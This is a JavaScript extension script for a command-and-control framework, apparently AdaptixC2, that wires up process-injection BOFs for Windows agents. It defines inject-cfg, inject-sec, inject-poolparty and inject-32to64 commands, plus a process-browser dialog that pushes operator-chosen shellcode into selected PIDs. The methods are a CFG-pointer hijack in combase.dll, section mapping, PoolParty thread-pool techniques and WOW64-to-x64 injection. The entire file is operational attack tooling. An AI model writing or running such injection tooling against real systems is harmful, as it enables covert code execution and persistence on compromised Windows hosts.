var metadata = {
    name: "Injection-BOF",
    description: "BOFs for process injection"
};

/// COMMANDS

var cmd_inject_cfg = ax.create_command("inject-cfg", "Inject shellcode into a target process and hijack execution via overwriting combase.dll!__guard_check_icall_fptr", "inject-cfg 808 /tmp/shellcode.bin");
cmd_inject_cfg.addArgInt("pid", true);
cmd_inject_cfg.addArgFile("shellcode", true);
cmd_inject_cfg.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode_content = parsed_json["shellcode"];

    let bof_params = ax.bof_pack("int,bytes", [pid, shellcode_content]);
    let bof_path = ax.script_dir() + "_bin/inject_cfg." + ax.arch(id) + ".o";
    let message = "Task: Executing DataInject-BOF by @0xLegacyy";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});


var cmd_inject_sec = ax.create_command("inject-sec", "Injects desired shellcode into target process using section mapping", "inject-sec 808 /tmp/shellcode.bin");
cmd_inject_sec.addArgInt("pid", true);
cmd_inject_sec.addArgFile("shellcode", true);
cmd_inject_sec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode_content = parsed_json["shellcode"];

    let bof_params = ax.bof_pack("int,bytes", [pid, shellcode_content]);
    let bof_path = ax.script_dir() + "_bin/inject_sec." + ax.arch(id) + ".o";
    let message = "Task: inject shellcode (section mapping)";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});


var cmd_inject_poolparty = ax.create_command("inject-poolparty", "Injects desired shellcode into target process using specified pool party technique", "inject-poolparty 7 808 /tmp/shellcode.bin");
cmd_inject_poolparty.addArgInt("technique", true, "1 - Overwrite the start routine, 2 - TP_WORK, 3 - Insert TP_WAIT, 4 - TP_IO, 5 - TP_ALPC, 6 - Insert TP_JOB, 7 - TP_DIRECT, 8 - TP_TIMER");
cmd_inject_poolparty.addArgInt("pid", true)
cmd_inject_poolparty.addArgFile("shellcode", true);
cmd_inject_poolparty.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode_content = parsed_json["shellcode"];
    let technique = parsed_json["technique"];

    let bof_params = ax.bof_pack("int,bytes,int", [pid, shellcode_content, technique]);
    let bof_path = ax.script_dir() + "_bin/inject_poolparty." + ax.arch(id) + ".o";
    let message = "Task: inject shellcode (pool party " + "technique " + technique +")";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



var cmd_inject_32to64 = ax.create_command("inject-32to64", "Inject x64 shellcode from WOW64 (32-bit) process into native 64-bit process [requires 32-bit agent]", "inject-32to64 808 /tmp/shellcode.bin");
cmd_inject_32to64.addArgInt("pid", true);
cmd_inject_32to64.addArgFile("shellcode", true);
cmd_inject_32to64.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    if (ax.arch(id) !== "x32") {
        ax.console_message(id, "BOF error", "error", "inject-32to64 only works on 32-bit agents");
        return false;
    }

    let pid = parsed_json["pid"];
    let shellcode_content = parsed_json["shellcode"];

    let bof_params = ax.bof_pack("int,bytes", [pid, shellcode_content]);
    let bof_path = ax.script_dir() + "_bin/inject_32to64.x86.o";
    let message = "Task: inject x64 shellcode (32-bit WOW64 -> native x64)";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



var group_exec = ax.create_commands_group("Injection-BOF", [cmd_inject_cfg, cmd_inject_sec, cmd_inject_poolparty, cmd_inject_32to64]);
ax.register_commands_group(group_exec, ["beacon", "gopher", "kharon"], ["windows"], []);



/// MENU

let inject_action = menu.create_action("Inject shellcode", function(process_list) {
    let methods = {
        "inject-sec": "Injects desired shellcode into target process using section mapping",
        "inject-cfg": "Inject shellcode into a target process and hijack execution via overwriting combase.dll!__guard_check_icall_fptr",
        "inject-poolparty": "Injects desired shellcode into target process using pool party",
        "inject-32to64": "Inject x64 shellcode from WOW64 (32-bit) process into native 64-bit process [requires 32-bit agent] using RtlCreateUserThread"
    };
    let label_shellcode  = form.create_label("Shellcode file:");
    let text_shellcode   = form.create_textline();
    let button_shellcode = form.create_button("...");

    let label_method = form.create_label("Inject method:");
    let combo_method = form.create_combo();
    combo_method.addItems(["inject-sec", "inject-cfg", "inject-poolparty", "inject-32to64"]);

    let label_poolparty_variant = form.create_label("Inject method:");
    let combo_poolparty_variant = form.create_combo();
    combo_poolparty_variant.addItems(["1", "2", "3", "4", "5", "6", "7"]);
    label_poolparty_variant.setVisible(false);
    combo_poolparty_variant.setVisible(false);

    let text_description = form.create_textmulti( methods["inject-sec"] );
    text_description.setReadOnly(true);

    let layout = form.create_gridlayout();
    layout.addWidget(label_shellcode,  0, 0, 1, 1);
    layout.addWidget(text_shellcode,   0, 1, 1, 1);
    layout.addWidget(button_shellcode, 0, 2, 1, 1);
    layout.addWidget(label_method,     1, 0, 1, 1);
    layout.addWidget(combo_method,     1, 1, 1, 2);
    layout.addWidget(label_poolparty_variant, 2, 0, 1, 1);
    layout.addWidget(combo_poolparty_variant, 2, 1, 1, 2);
    layout.addWidget(text_description, 3, 0, 1, 3);

    form.connect(combo_method, "currentTextChanged", function(text) {
        text_description.setText( methods[text] );

        label_poolparty_variant.setVisible(false);
        combo_poolparty_variant.setVisible(false);
        if(text == "inject-poolparty") {
            label_poolparty_variant.setVisible(true);
            combo_poolparty_variant.setVisible(true);
        }
    });

    form.connect(button_shellcode, "clicked", function() {
        text_shellcode.setText( ax.prompt_open_file() );
    });

    let dialog = form.create_dialog("Inject shellcode");
    dialog.setSize(460, 240);
    dialog.setLayout(layout);
    dialog.setButtonsText("Inject", "Cancel");
    while ( dialog.exec() == true )  {
        let shellcode_path = text_shellcode.text();
        if(shellcode_path.length == 0) { ax.show_message("Error", "Shellcode not specified"); continue; }

        let shellcode_content = ax.file_read(shellcode_path);
        if(shellcode_content.length == 0) { ax.show_message("Error", `file ${shellcode_path} not readed`); continue; }

        let method  = combo_method.currentText();
        let variant = combo_poolparty_variant.currentText();

        process_list.forEach((proc) => {
            if(method == "inject-poolparty") {
                let command = `${method} ${variant} ${proc.pid} ${shellcode_path}`;
                ax.execute_command(proc.agent_id, command);
            } else {
                let command = `${method} ${proc.pid} ${shellcode_path}`;
                ax.execute_command(proc.agent_id, command);
            }
        });
        break;
    }
});
menu.add_processbrowser(inject_action, ["beacon", "gopher", "kharon"], ["windows"]);